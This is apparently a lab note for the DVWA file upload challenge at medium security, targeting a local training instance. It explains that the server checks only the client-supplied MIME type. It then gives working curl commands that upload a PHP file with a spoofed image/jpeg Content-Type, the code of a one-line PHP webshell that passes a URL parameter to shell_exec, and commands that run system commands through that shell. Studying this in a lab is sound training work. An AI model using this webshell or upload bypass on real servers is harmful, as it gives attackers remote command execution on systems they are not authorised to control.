# DVWA File Upload — Medium Security

## URL
http://127.0.0.1:4280/vulnerabilities/upload/

## Source Code Behavior (Medium)
- Checks MIME type (Content-Type header)
- Only allows `image/jpeg` and `image/png`
- Checks file size (< 100000 bytes)
- Does NOT check file extension
- Does NOT check actual file content/magic bytes

## Key Differences from Low
1. MIME type must be image/jpeg or image/png
2. File size limit enforced
3. But extension and content are NOT checked

## Bypass Techniques

### Intercept and change Content-Type header
Upload a PHP file but modify the Content-Type header to `image/jpeg`:
1. Upload shell.php
2. Intercept the request (Burp Suite or curl)
3. Change `Content-Type: application/x-php` → `Content-Type: image/jpeg`
4. File uploaded as shell.php with image MIME type

## Working Payloads

### curl with spoofed MIME type
```bash
curl -X POST "http://127.0.0.1:4280/vulnerabilities/upload/" \
  -F "uploaded=@shell.php;type=image/jpeg" \
  -F "Upload=Upload" \
  -b "PHPSESSID=<session>;security=medium"
```

### shell.php content
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

## Step-by-Step Exploitation
1. Create `shell.php` with PHP webshell code
2. Upload with spoofed Content-Type: `image/jpeg`
3. Server accepts the file (MIME type check passes)
4. Access `http://127.0.0.1:4280/hackable/uploads/shell.php?cmd=whoami`
5. PHP executes — full command execution

## curl Commands
```bash
# Upload with spoofed MIME type
curl -X POST "http://127.0.0.1:4280/vulnerabilities/upload/" \
  -F "uploaded=@shell.php;type=image/jpeg" \
  -F "Upload=Upload" \
  -b "PHPSESSID=<session>;security=medium"

# Execute commands
curl "http://127.0.0.1:4280/hackable/uploads/shell.php?cmd=id" \
  -b "PHPSESSID=<session>;security=medium"
```

## Notes
- MIME type (Content-Type) is client-controlled — trivially spoofed
- Server trusts the client's declared content type
- Extension is not checked — .php file runs even with image MIME
- Never rely on Content-Type header for security validation
